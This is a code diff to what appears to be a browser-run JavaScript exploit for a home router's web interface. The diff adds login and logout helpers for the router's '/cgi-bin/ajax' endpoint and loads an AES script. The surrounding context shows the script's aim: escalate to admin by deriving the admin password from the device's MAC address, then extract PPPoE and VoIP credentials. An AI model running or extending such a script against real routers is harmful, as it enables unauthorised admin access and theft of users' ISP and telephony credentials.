@@ -22,6 +22,31 @@ async function getJSON(url) {
     return response.json();
 }
 
+async function logout() {
+    const { sessionid } = await getJSON(EP_CHECK_LOGIN);
+    const r = await fetch('/cgi-bin/ajax', {
+        headers: { "content-type": "application/x-www-form-urlencoded" },
+        method: 'POST',
+        body: `username=common&sessionid=${sessionid}&ajaxmethod=do_logout`,
+    });
+    return r.json();
+}
+
+async function login(username, password) {
+    await logout();
+
+    const { sessionid } = await getJSON(EP_CHECK_LOGIN);
+
+    const r = await fetch('/cgi-bin/ajax', {
+        headers: { "content-type": "application/x-www-form-urlencoded" },
+        method: 'POST',
+        body: `username=${username}&loginpd=${fhencrypt(password)}&port=0&sessionid=${sessionid}&ajaxmethod=do_login`,
+    });
+    const data = await r.json();
+    if (data.login_result !== 0) throw new Error(`Login failed (login_result: ${data.login_result})`);
+    return data;
+}
+
 async function prep_cfg() {
     const { sessionid } = await getJSON(EP_CHECK_LOGIN);
     const r = await fetch('/cgi-bin/ajax', {
@@ -32,7 +57,6 @@ async function prep_cfg() {
     return r.json();
 }
 
-// Download config function
 async function downloadConfig() {
     await prep_cfg();
     window.location = "/cgi-bin/download?usrconfig_conf";
@@ -214,6 +238,8 @@ const extractedData = {
     "PPPoE creds": [],
     "Voip creds": []
 };
+// Load scripts
+await loadJS('/js/aes.js');
 
 // Phase 1: Check login and escalate to admin
 // Not logged in > login as user > get mac > generate pass > login as admin
